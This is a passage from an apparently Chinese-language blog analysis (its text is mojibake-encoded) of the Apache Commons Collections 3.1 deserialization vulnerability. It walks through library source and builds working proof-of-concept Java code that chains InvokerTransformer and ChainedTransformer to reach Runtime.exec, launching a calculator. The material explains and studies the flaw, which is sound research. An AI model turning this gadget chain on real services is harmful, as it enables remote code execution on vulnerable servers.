class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChain</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§¦å‘æ¼æ´</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496790.jpg" alt="-w1299"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>æ¼æ´ç‚¹åœ¨<code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/InvokerTransformer.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//105è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡å®ç°<code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/Transformer.java</code> <code>Transformer</code>æ¥å£ï¼Œ<code>InvokerTransformer</code>æ„é€ æ–¹æ³•åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼ å…¥å‚æ•°å‡½æ•°æ–¹æ³•åä»¥åŠå‚æ•°åï¼Œ<code>transform</code>æ–¹æ³•ä½¿ç”¨javaåå°„æœºåˆ¶å¾—ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ã€‚<br><code>Transformer</code>æ¥å£:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>Javaåå°„æœºåˆ¶å³å‚æ•°ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åé€šè¿‡<code>getClass</code>ã€<code>getMethod</code>ç­‰æ–¹æ³•å»è·å–å…¶æ‰€å±çš„ç±»ã€æ‰€æ‹¥æœ‰çš„å¯¹è±¡ã€‚</p></blockquote><p>åœ¨Javaä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œè°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„ä»£ç é€šå¸¸ä¸ºï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥é€šè¿‡æ„é€ è¿™æ®µä»£ç å®ç°å‘½ä»¤æ‰§è¡Œï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalObject</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer  invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ååºåˆ—åŒ–åä¸€èˆ¬åªéœ€è¦æ‰§è¡Œ<code>readObject</code>å‡½æ•°å³å¯ï¼Œå¦‚æœç›´æ¥åºåˆ—åŒ–<code>invokerTransformer</code>å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>readObject</code>ä¹‹åçš„å¯¹è±¡è¿˜éœ€è¦ä¸»åŠ¨è°ƒç”¨<code>transform(Runtime.getRuntime())</code>å‡½æ•°æ‰èƒ½å¾—ä»¥å‘½ä»¤æ‰§è¡Œï¼Œæ˜¾ç„¶æ˜¯ä¸å¤ªç°å®çš„ã€‚<br>demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123; String.class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;);</span><br><span class="line">        serialize(invokerTransformer);</span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–å®Œäº†è¿˜å¾—è°ƒå¯¹è±¡çš„transformæ–¹æ³•</span></span><br><span class="line">        InvokerTransformer obj = (InvokerTransformer) unserialize();</span><br><span class="line">        obj.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(InvokerTransformer obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            <span class="keyword">return</span> is.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496797.jpg" alt="-w1293"></p><h3 id="step2-åå°„é“¾æ„é€ "><a href="#step2-åå°„é“¾æ„é€ " class="headerlink" title="step2: åå°„é“¾æ„é€ "></a>step2: åå°„é“¾æ„é€ </h3><p>è¿™æ„å‘³ç€<code>Runtime.getRuntime()</code>çš„è°ƒç”¨ä¹Ÿéœ€è¦æˆ‘ä»¬é€šè¿‡åå°„æ¥è¿›è¡Œè°ƒç”¨ï¼Œè€Œ<code>InvokerTransformer</code>çš„<code>tansform</code>å‡½æ•°ä¸€æ¬¡åªèƒ½è¿›è¡Œä¸€æ¬¡åå°„ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªåå°„é“¾ï¼Œæœ€ç»ˆè°ƒç”¨<code>exec</code>å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>åœ¨ <code>/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/ChainedTransformer.java</code> ä¸­æä¾›äº†æˆ‘ä»¬æ„é€ ä¸€ä¸ªå‡½æ•°å¯¹è±¡è°ƒç”¨é“¾çš„ä¸€ä¸ªæ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 109è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç»™<code>ChainedTransformer</code>æ–¹æ³•ä¼ é€’ä¸€ä¸ªæ•°ç»„ï¼Œåœ¨<code>transform</code>æ–¹æ³•é‡Œéå†è°ƒç”¨å…¶<code>transform</code>æ–¹æ³•ï¼Œå¹¶å°†è¿”å›çš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡<code>transform</code>å‡½æ•°çš„å‚æ•°ã€‚</p><p>æ­¤æ—¶å¯ä»¥æ„é€ å‡ºè¿™æ ·ä¸€ä¸ªpocï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//ä¼ å…¥Runtimeç±»</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//åå°„è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        serialize(transformerChain);</span><br><span class="line">        <span class="comment">// é€šè¿‡è¿›ä¸€æ­¥æ„é€ åå°„é“¾ï¼Œè¿™é‡Œçš„transformä¼ é€’ä¸€ä¸ªç©ºå‚æ•°å³å¯ã€‚</span></span><br><span class="line">        Transformer transformer = (Transformer) unserialize();</span><br><span class="line">        transformer.transform(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Transformer obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"test.ser"</span>));</span><br><span class="line">            <span class="keyword">return</span> is.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496805.jpg" alt="-w1246"></p><p>åœ¨<code>Transformer</code>æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸­ç”¨åˆ°äº†<code>ConstantTransformer</code>ç±»ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 64è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡åˆå§‹åŒ–å¯¹è±¡ä¼ å…¥<code>Runtime.class</code>ç±»ä½œä¸ºå‚æ•°ï¼Œç„¶ååœ¨<code>ChainedTransformer</code>ç±»éå†æ•°ç»„è°ƒç”¨å…¶ <code>ConstantTransformer</code>çš„<code>transform</code>æ–¹æ³•è¿”å›<code>Runtime</code>ç±»ã€‚</p><p>ä»<code>transformer.transform(&quot;&quot;);</code>ä¸‹æ–­ç‚¹è·Ÿè¿›ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496813.jpg" alt="-w1057"></p><p>éå†æ•°ç»„ï¼Œç¬¬ä¸€æ¬¡è¿›å…¥<code>ConstantTransformer</code>çš„<code>transform</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496821.jpg" alt="-w1286"></p><p><code>ConstantTransformer</code>çš„<code>transform</code>è¿”å›åœ¨å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„<code>Runtime</code>ç±»ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496828.jpg" alt="-w1030"></p><p>ç¬¬äºŒæ¬¡å¾ªç¯ï¼Œå°†ç¬¬ä¸€æ¬¡è¿”å›çš„<code>Runtime</code>ç±»ä½œä¸ºå‚æ•°ï¼Œå¸¦å…¥ç¬¬äºŒæ¬¡<code>InvokerTransformer</code>ç±»çš„<code>transform</code>å‡½æ•°å‚æ•°ä¸­ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496839.jpg" alt="-w1098"><br>è¿™é‡Œé€šè¿‡javaåå°„æœºåˆ¶ï¼Œä»<code>Runtime</code>ç±»æ‰¾åˆ°å…¶<code>getRuntime</code>æ–¹æ³•ï¼Œè¿”å›<code>Runtime.getRuntime()</code>æ–¹æ³•ï¼Œä½œä¸ºä¸‹æ¬¡å¾ªç¯çš„å‚æ•°ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496850.jpg" alt="-w1150"></p><p>ç¬¬ä¸‰æ¬¡å¾ªç¯å†æ¬¡é€šè¿‡<code>InvokerTransformer</code>ç±»çš„<code>transform</code>æ–¹æ³•ï¼Œé€šè¿‡åå°„è°ƒç”¨<code>invoke</code>æ–¹æ³•ï¼ŒçœŸæ­£çš„æ‰§è¡Œ<code>getRuntime</code>å‡½æ•°å¹¶è¿”å›<code>Runtime</code>å®ä¾‹<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496860.jpg" alt="-w1227"></p><p>åœ¨ç¬¬å››è½®ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>object</code>å‚æ•°å˜æˆäº†<code>Runtime</code>å¯¹è±¡ï¼Œå¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨<code>exec</code>å‡½æ•°æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496871.jpg" alt="-w1233"><br>æœ€åæ‰§è¡Œå‘½ä»¤ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496881.jpg" alt="-w1251"></p><h3 id="step3ï¼šå¯»æ‰¾è‡ªåŠ¨è§¦å‘transform"><a href="#step3ï¼šå¯»æ‰¾è‡ªåŠ¨è§¦å‘transform" class="headerlink" title="step3ï¼šå¯»æ‰¾è‡ªåŠ¨è§¦å‘transform"></a>step3ï¼šå¯»æ‰¾è‡ªåŠ¨è§¦å‘<code>transform</code></h3><p>åœ¨step2çš„pocä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œååºåˆ—åŒ–ä¹‹åå…¶å®è¿˜æœ‰ä¸€ä¸ªå¯¹å¯¹è±¡è¿›è¡Œ<code>transform</code>å‡½æ•°çš„è°ƒç”¨ï¼Œè™½ç„¶æ­¤æ—¶å·²ç»é€šè¿‡åå°„é“¾è§£å†³äº†<code>Runtime.getRuntime()</code>çš„å‚æ•°ä¼ å…¥é—®é¢˜ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦æˆ‘ä»¬è°ƒç”¨<code>transform</code>å‡½æ•°ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = (Transformer) unserialize();</span><br><span class="line">transformer.transform(<span class="string">""</span>);</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·çš„æ¡ä»¶åœ¨å®é™…ç¯å¢ƒä¸­æ˜¯éš¾ä»¥åˆ©ç”¨çš„ï¼Œæˆ‘ä»¬å¸Œæœ›çš„æ˜¯ä»…è°ƒç”¨<code>readObject</code>å‡½æ•°å°±èƒ½å¤Ÿè§¦å‘æ¼æ´ï¼Œå³éœ€è¦å¯»æ‰¾ä¸€ä¸ªæœ‰è¢«é‡å†™çš„<code>readObject</code>å‡½æ•°ï¼Œè€Œå…¶ä¸­çš„æµç¨‹èƒ½å¤Ÿè§¦å‘<code>transform</code>å‡½æ•°(å¯ä»¥ç›´æ¥æœç´¢è¿™ä¸¤ä¸ªå…³é”®å­—å¯»æ‰¾)ã€‚</p><p>åœ¨<code>/org/apache/commons/collections/map/TransformedMap.java</code>ä¸­:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//65è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//87è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//137è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//183è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    